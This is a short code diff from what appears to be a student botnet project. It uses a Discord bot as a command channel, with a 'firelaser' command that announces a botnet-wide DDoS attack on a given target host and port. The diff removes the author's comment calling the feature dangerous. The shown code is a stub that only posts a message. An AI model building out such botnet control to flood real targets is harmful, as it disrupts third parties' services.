@@ -129,10 +129,6 @@ async def ss(ctx):
 #command to start entire botnet ddos at target
 @bot.command("firelaser")
 async def fireLaser(ctx, TARGET, TPORT):
-    """This could be a really dangerous thing to show the class,
-    but so is this entire project haha.
-    Please let me know if you dont want me to implement this,
-    or at least not show it to the class."""
     await ctx.send(f"{botID} has started attack on {TARGET}:{TPORT}")
 
 #command to stop entire botnet ddos at target
